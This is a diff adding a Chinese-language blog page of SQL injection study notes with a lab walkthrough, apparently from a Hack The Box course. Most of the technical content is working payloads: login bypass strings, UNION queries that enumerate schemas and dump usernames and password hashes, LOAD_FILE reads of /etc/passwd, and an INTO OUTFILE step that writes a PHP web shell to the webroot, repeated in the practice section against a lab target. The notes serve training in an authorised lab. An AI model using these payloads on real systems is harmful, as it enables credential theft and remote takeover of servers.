@@ -1,0 +1,692 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || sql</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>sql </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/26
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#00a596>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p><a target="_blank" rel="noopener" href="https://www.sqlinjection.net/stacked-queries/">stacked</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mysqltutorial.org/sql-union-mysql.aspx/">Union</a></p>
+<p>一旦攻击者能够注入，他们就必须寻找执行不同SQL查询的方法。这可以使用SQL代码来组成一个工作查询，该查询同时执行预期的和新的SQL查询。有很多方法可以实现这一点，比如使用堆叠查询或使用联合查询。最后，为了检索新查询的输出，我们必须在web应用程序的前端对其进行解释或捕获。</p>
+<span id="more"></span>
+
+
+
+<h2 id="SQLi-Discovery"><a href="#SQLi-Discovery" class="headerlink" title="SQLi Discovery"></a>SQLi Discovery</h2><p>在我们开始颠覆web应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到SQL注入的攻击。要做到这一点，我们将尝试在用户名后添加以下有效载荷之一，看看它是否会导致任何错误或改变页面的行为：</p>
+<table>
+<thead>
+<tr>
+<th><code>&#39;</code></th>
+<th><code>%27</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;</code></td>
+<td><code>%22</code></td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td><code>%23</code></td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td><code>%3B</code></td>
+</tr>
+<tr>
+<td><code>)</code></td>
+<td><code>%29</code></td>
+</tr>
+</tbody></table>
+<p>注意：在某些情况下，我们可能不得不使用URL编码的有效载荷版本。这方面的一个例子是，我们将有效负载直接放在URL“即HTTP GET请求”中。</p>
+<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>常规</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td>
+<td>登录 MySQL 数据库</td>
+</tr>
+<tr>
+<td><code>SHOW DATABASES</code></td>
+<td>列出可用数据库</td>
+</tr>
+<tr>
+<td><code>USE users</code></td>
+<td>切换到数据库</td>
+</tr>
+<tr>
+<td><strong>表</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>CREATE TABLE logins (id INT, ...)</code></td>
+<td>添加新表</td>
+</tr>
+<tr>
+<td><code>SHOW TABLES</code></td>
+<td>列出当前数据库中的可用表</td>
+</tr>
+<tr>
+<td><code>DESCRIBE logins</code></td>
+<td>显示表属性和列</td>
+</tr>
+<tr>
+<td><code>INSERT INTO table_name VALUES (value_1,..)</code></td>
+<td>向表中添加值</td>
+</tr>
+<tr>
+<td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td>
+<td>向表中的特定列添加值</td>
+</tr>
+<tr>
+<td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td>
+<td>更新表值</td>
+</tr>
+<tr>
+<td><strong>列</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT * FROM table_name</code></td>
+<td>显示表中的所有列</td>
+</tr>
+<tr>
+<td><code>SELECT column1, column2 FROM table_name</code></td>
+<td>显示表中的特定列</td>
+</tr>
+<tr>
+<td><code>DROP TABLE logins</code></td>
+<td>删除表</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins ADD newColumn INT</code></td>
+<td>添加新列</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td>
+<td>重命名列</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td>
+<td>更改列数据类型</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins DROP oldColumn</code></td>
+<td>删除列</td>
+</tr>
+<tr>
+<td><strong>输出</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1</code></td>
+<td>按列排序</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td>
+<td>按列降序排序</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td>
+<td>按两列排序</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 2</code></td>
+<td>仅显示前两个结果</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 1, 2</code></td>
+<td>仅显示从索引 2 开始的前两个结果</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td>
+<td>列出满足条件的结果</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></td>
+<td>列出名称类似于给定字符串的结果</td>
+</tr>
+</tbody></table>
+<h2 id="MySQL-运算符优先级"><a href="#MySQL-运算符优先级" class="headerlink" title="MySQL 运算符优先级"></a>MySQL 运算符优先级</h2><ul>
+<li>除法 （）、乘法 （） 和模数 （<code>/``*``%</code>)</li>
+<li>加法 （） 和减法 （<code>+``-</code>)</li>
+<li>比较 （， ， ， ， ， ， ，<code>=``&gt;``&lt;``&lt;=``&gt;=``!=``LIKE</code>)</li>
+<li>不是 （<code>!</code>)</li>
+<li>和 （<code>&amp;&amp;</code>)</li>
+<li>或 （<code>||</code>)</li>
+</ul>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><table>
+<thead>
+<tr>
+<th><strong>有效载荷</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>身份验证旁路</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>admin&#39; or &#39;1&#39;=&#39;1</code></td>
+<td>基本身份验证绕过</td>
+</tr>
+<tr>
+<td><code>admin&#39;)-- -</code></td>
+<td>带注释的基本身份验证绕过</td>
+</tr>
+<tr>
+<td>[身份验证绕过有效负载](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL</a> Injection#authentication-bypass)</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>联合注射</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&#39; order by 1-- -</code></td>
+<td>使用 检测列数<code>order by</code></td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,2,3-- -</code></td>
+<td>使用联合进样检测列数</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,@@version,3,4-- -</code></td>
+<td>基本联合注射</td>
+</tr>
+<tr>
+<td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td>
+<td>4 列联合进样</td>
+</tr>
+<tr>
+<td><strong>数据库枚举</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT @@version</code></td>
+<td>具有查询输出的指纹 MySQL</td>
+</tr>
+<tr>
+<td><code>SELECT SLEEP(5)</code></td>
+<td>没有输出的指纹MySQL</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,database(),2,3-- -</code></td>
+<td>当前数据库名称</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
+<td>列出所有数据库</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></td>
+<td>列出特定数据库中的所有表</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></td>
+<td>列出特定表中的所有列</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></td>
+<td>从另一个数据库中的表中转储数据</td>
+</tr>
+<tr>
+<td><strong>特权</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, user(), 3, 4-- -</code></td>
+<td>查找当前用户</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></td>
+<td>查找用户是否具有管理员权限</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></td>
+<td>查找是否所有用户权限</td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></td>
+<td>查找可以通过 MySQL 访问的目录</td>
+</tr>
+<tr>
+<td><strong>文件注入</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></td>
+<td>读取本地文件</td>
+</tr>
+<tr>
+<td><code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></td>
+<td>将字符串写入本地文件</td>
+</tr>
+<tr>
+<td><code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></td>
+<td>将 Web 外壳写入基本 Web 目录</td>
+</tr>
+</tbody></table>
+<p>检测列数的第一种方法是通过ORDERBY函数，我们前面已经讨论过了。我们必须注入一个查询，该查询根据我们指定的列对结果进行排序，“即，列1、列2等”，直到我们收到一个错误，表明指定的列不存在。 例如，我们可以从order by 1开始，按第一列排序，然后成功，因为表必须至少有一列。然后，我们将按2排序，然后按3排序，直到到达返回错误的数字，或者页面没有显示任何输出，这意味着该列编号不存在。我们成功排序的最后一个成功列给出了列的总数。</p>
+<p>另一种方法是尝试使用不同数量的列进行联合注入，直到我们成功地返回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出错误，直到我们获得成功。</p>
+<pre><code class="sql">cn&#39; UNION select 1,2,3-- -
+</code></pre>
+<p>不是每一列都会显示给用户，这是非常常见的。例如，ID字段通常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们，打印第2列和第3列以及第4列是为了将我们的注入放在其中任何一列中。我们不能把我们的注入放在一开始，否则它的输出将不会打印出来。 这就是使用数字作为垃圾数据的好处，因为它可以很容易地跟踪打印的列，这样我们就知道要将查询放在哪一列。为了测试我们是否可以从数据库“而不仅仅是数字”中获得实际数据，我们可以使用@@version SQL查询作为测试，并将其放在第二列，而不是数字2：</p>
+<pre><code class="sql">cn&#39; UNION select 1,@@version,3,4-- -
+</code></pre>
+<p>在枚举数据库之前，我们通常需要确定我们正在处理的DBMS的类型。这是因为每个DBMS都有不同的查询，知道它是什么将有助于我们知道要使用什么查询。 作为最初的猜测，如果我们在HTTP响应中看到的Web服务器是Apache或Nginx，那么很好的猜测是该Web服务器运行在Linux上，因此DBMS很可能是MySQL。如果Web服务器是IIS，那么这同样适用于Microsoft DBMS，因此它很可能是MSSQL。然而，这是一个牵强的猜测，因为许多其他数据库可以在操作系统或web服务器上使用。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。</p>
+<p>MySQL：</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>When to Use</th>
+<th>Expected Output</th>
+<th>Wrong Output</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SELECT @@version</code></td>
+<td>When we have full query output</td>
+<td>MySQL Version ‘i.e. <code>10.3.22-MariaDB-1ubuntu1</code>‘</td>
+<td>In MSSQL it returns MSSQL version. Error with other DBMS.</td>
+</tr>
+<tr>
+<td><code>SELECT POW(1,1)</code></td>
+<td>When we only have numeric output</td>
+<td><code>1</code></td>
+<td>Error with other DBMS</td>
+</tr>
+<tr>
+<td><code>SELECT SLEEP(5)</code></td>
+<td>Blind&#x2F;No Output</td>
+<td>Delays page response for 5 seconds and returns <code>0</code>.</td>
+<td>Will not delay response with other DBMS</td>
+</tr>
+</tbody></table>
+<h4 id="INFORMATION-SCHEMA"><a href="#INFORMATION-SCHEMA" class="headerlink" title="INFORMATION_SCHEMA"></a><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html">INFORMATION_SCHEMA</a></h4><p>要使用UNIONSELECT从表中提取数据，我们需要正确地形成SELECT查询。为此，我们需要以下信息： 数据库列表 每个数据库中的表列表 每个表中的列列表 有了以上信息，我们可以形成SELECT语句来转储DBMS内任何数据库中任何表中任何列的数据。这就是我们可以利用INFORMATION_SCHEMA数据库的地方。 INFORMATION_SCHEMA数据库包含有关服务器上存在的数据库和表的元数据。该数据库在利用SQL注入漏洞时发挥着至关重要的作用。由于这是一个不同的数据库，我们不能用SELECT语句直接调用它的表。如果我们只为SELECT语句指定一个表的名称，它将在同一数据库中查找表。 因此，要引用另一个数据库中的表，我们可以使用点“.”操作人员例如，要选择名为my_database的数据库中存在的表用户，我们可以使用：</p>
+<pre><code class="sql">SELECT * FROM my_database.users;
+</code></pre>
+<h4 id="SCHEMATA"><a href="#SCHEMATA" class="headerlink" title="SCHEMATA"></a><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html">SCHEMATA</a></h4><p>要开始枚举，我们应该找到DBMS上可用的数据库。INFORMATION_SCHEMA数据库中的表SCHETA包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。SCHEMA_NAME列包含当前存在的所有数据库名称。 让我们首先在本地数据库上测试这一点，看看查询是如何使用的：</p>
+<pre><code class="shell-session">mysql&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+</code></pre>
+<p>在从dev数据库转储数据之前，我们需要获得一个表列表，以便使用SELECT语句查询它们。要查找数据库中的所有表，我们可以使用INFORMATION_SCHEMA数据库中的tables表。 TABLES表包含有关整个数据库中所有表的信息。此表包含多个列，但我们对table_SCHEMA和table_NAME列感兴趣。TABLE_NAME列存储表名，而TABLE_SCHEMA列指向每个表所属的数据库。这可以与我们查找数据库名称的方式类似。例如，我们可以使用以下有效负载来查找dev数据库中的表：</p>
+<pre><code class="sql">cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -
+</code></pre>
+<h2 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h2><p>读取数据比写入数据要常见得多，在现代数据库管理系统中，写入数据是严格为特权用户保留的，因为它可能会导致系统利用，正如我们将看到的那样。例如，在MySQL中，DB用户必须具有FILE权限才能将文件的内容加载到表中，然后从该表中转储数据并读取文件。因此，让我们从收集数据库中有关用户权限的数据开始，以决定是否将文件读取和&#x2F;或写入后端服务器。</p>
+<p>首先，我们必须确定数据库中的用户。虽然我们不一定需要数据库管理员（DBA）权限来读取数据，但在现代DBMS中，这一点变得越来越重要，因为只有DBA才能获得这样的权限。这同样适用于其他常见数据库。如果我们确实拥有DBA权限，那么我们更有可能拥有文件读取权限。如果我们不这样做，那么我们必须检查我们的权限，看看我们能做什么。为了能够找到我们当前的DB用户，我们可以使用以下任何查询：</p>
+<pre><code class="sql">SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+</code></pre>
+<p>既然我们知道了我们的用户，我们就可以开始寻找我们对该用户有什么特权了。首先，我们可以通过以下查询来测试我们是否具有超级管理员权限：</p>
+<pre><code class="sql">SELECT super_priv FROM mysql.user
+</code></pre>
+<p>查询返回Y，意思是YES，表示超级用户权限。我们还可以通过以下查询直接从模式中转储其他特权：</p>
+<pre><code class="sql">cn&#39; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+</code></pre>
+<h2 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE"></a>LOAD_FILE</h2><p>既然我们知道我们有足够的权限读取本地系统文件，那么让我们使用LOAD_FILE（）函数来完成这一操作。LOAD_FILE（）函数可以在MariaDB&#x2F;MMySQL中用于从文件中读取数据。该函数只接受一个参数，即文件名。以下查询是如何读取&#x2F;etc&#x2F;passwd文件的示例：</p>
+<pre><code class="sql">SELECT LOAD_FILE(&#39;/etc/passwd&#39;);
+</code></pre>
+<p>我们知道当前的页面是search.php。默认的Apache webroot是&#x2F;var&#x2F;www&#x2F;html。让我们试着阅读位于&#x2F;var&#x2F;www&#x2F;html&#x2F;search.php的文件的源代码。</p>
+<p>但是，页面最终会在浏览器中呈现HTML代码。点击[Ctrl+U]可以查看HTML源代码。</p>
+<h1 id="Writing-Files"><a href="#Writing-Files" class="headerlink" title="Writing Files"></a>Writing Files</h1><p>当涉及到将文件写入后端服务器时，它在现代DBMS中变得更加受限，因为我们可以利用它在远程服务器上编写web shell，从而执行代码并接管服务器。这就是为什么现代DBMS默认情况下禁用文件写入，并要求DBA具有某些权限来写入文件。在写入文件之前，我们必须首先检查我们是否有足够的权限，以及DBMS是否允许写入文件。</p>
+<p>为了能够使用MySQL数据库将文件写入后端服务器，我们需要三件事： 启用FILE权限的用户 MySQL全局secure_file_priv变量未启用 对后端服务器上要写入的位置的写入访问权限 我们已经发现，我们的当前用户拥有写入文件所需的FILE权限。我们现在必须检查MySQL数据库是否具有该权限。这可以通过检查secure_file_priv全局变量来完成。</p>
+<h4 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/server-system-variables/#secure_file_priv">secure_file_priv</a></h4><p>secure_file_priv变量用于确定从何处读取&#x2F;写入文件。空值允许我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，NULL意味着我们不能从任何目录中读取&#x2F;写入。MariaDB默认情况下将此变量设置为空，如果用户具有file权限，则可以读取&#x2F;写入任何文件。但是，MySQL使用&#x2F;var&#x2F;lib&#x2F;MySQL文件作为默认文件夹。这意味着在默认设置下无法通过MySQL注入读取文件。更糟糕的是，一些现代配置默认为NULL，这意味着我们无法在系统中的任何位置读取&#x2F;写入文件。 因此，让我们看看如何找到secure_file_priv的值。在MySQL中，我们可以使用以下查询来获取该变量的值：</p>
+<pre><code class="sql">SHOW VARIABLES LIKE &#39;secure_file_priv&#39;;
+</code></pre>
+<p>但是，当我们使用UNION注入时，我们必须使用SELECT语句来获取值。这应该不是问题，因为所有变量和大多数配置都存储在INFORMATION_SCHEMA数据库中。MySQL全局变量存储在一个名为global_variables的表中，根据文档，该表有两列variable_name和variable_value。 我们必须从INFORMATION_SCHEMA数据库中的表中选择这两列。MySQL配置中有数百个全局变量，我们不想检索所有这些变量。然后，我们将使用我们在上一节中了解到的WHERE子句来过滤结果，以仅显示secure_file_priv变量。 最终的SQL查询如下：</p>
+<pre><code class="sql">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;
+</code></pre>
+<h2 id="SELECT-INTO-OUTFILE"><a href="#SELECT-INTO-OUTFILE" class="headerlink" title="SELECT INTO OUTFILE"></a><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a></h2><p>既然我们已经确认我们的用户应该将文件写入后端服务器，那么让我们尝试使用SELECT。。INTO OUTFILE语句。SELECT INTO OUTFILE语句可用于将选择查询中的数据写入文件。这通常用于从表中导出数据。 要使用它，我们可以添加INTO OUTFILE“…”在我们的查询之后，将结果导出到我们指定的文件中。以下示例将users表的输出保存到&#x2F;tmp&#x2F;credentials文件中：</p>
+<pre><code class="shell-session">SELECT * from users INTO OUTFILE &#39;/tmp/credentials&#39;;
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ cat /tmp/credentials 
+
+1       admin   392037dbba51f692776d6cefb6dd546d
+2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
+</code></pre>
+<p>还可以直接将字符串选择到文件中，从而允许我们将任意文件写入后端服务器。</p>
+<pre><code class="sql">SELECT &#39;this is a test&#39; INTO OUTFILE &#39;/tmp/test.txt&#39;;
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ cat /tmp/test.txt 
+
+this is a test
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /tmp/test.txt 
+
+-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
+</code></pre>
+<p>提示：高级文件导出使用’FROM_BASE64（“BASE64_data”）’函数，以便能够写入长&#x2F;高级文件，包括二进制数据。</p>
+<h1 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h1><pre><code>target:138.68.166.146:32658
+评估web应用程序，并使用各种技术来获得远程代码执行，并在文件系统的/root目录中找到标志。提交标志的内容作为您的答案。
+</code></pre>
+<p>登录界面可以直接用or绕过，然后应该是使用这个搜索功能：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271720631.png" alt="image-20230627172018882"></p>
+<p>用order 命令发现有五个列</p>
+<p><code>&#39; UNION SELECT 1,2,3,4,5 -- - </code></p>
+<p>找到可以回显的位置：2、3、4、5</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230627172256079.png" alt="image-20230627172256079"></p>
+<p>然后搜集一下基本信息：</p>
+<p>‘ UNION SELECT 1,2,3,4,5 – - </p>
+<p>database:ilfreight</p>
+<p>version:10.3.22-MariaDB-1ubuntu1</p>
+<p>查询数据库名：</p>
+<p><code>&#39; UNION SELECT 1,SCHEMA_NAME,3,4,5 FROM INFORMATION_SCHEMA.SCHEMATA-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271727250.png" alt="image-20230627172731638"></p>
+<p>ilfreight中的表名：</p>
+<p><code>&#39; UNION select 1,2,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;ilfreight&#39;-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271731778.png" alt="image-20230627173106224"></p>
+<p>查看users表中的列名：</p>
+<p><code>&#39; UNION select 0,1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;users&#39;-- - </code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271732559.png" alt="image-20230627173243903"></p>
+<p>查看具体数据：</p>
+<p><code>&#39; UNION select 0,1, username, password, 4 from ilfreight.users-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271735264.png" alt="image-20230627173507427"></p>
+<p>但是发现这居然不是flag….</p>
+<p>可能要读写一下文件：</p>
+<p>看下用户：</p>
+<p><code>&#39; UNION SELECT 1, user(), 3, 4，5-- -</code><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271739191.png" alt="image-20230627173936462"></p>
+<p>看看权限：</p>
+<p><code>&#39; UNION SELECT 0,1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271737117.png" alt="image-20230627173753181"></p>
+<p>有超级权限，ok,看看能写入的文档：</p>
+<p><code>&#39; UNION SELECT 0,1, VARIABLE_NAME, VARIABLE_VALUE, 4 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME=&quot;SECURE_FILE_PRIV&quot;-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271748037.png" alt="image-20230627174758369"></p>
+<p>返回空值，hh，开搞</p>
+<p><code>&#39; UNION SELECT &quot;&quot;,&quot;&quot;,&#39;&lt;?PHP SYSTEM($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; INTO OUTFILE &#39;/VAR/WWW/HTML/DASHBOARD/SHELL.PHP&#39;-- -</code></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
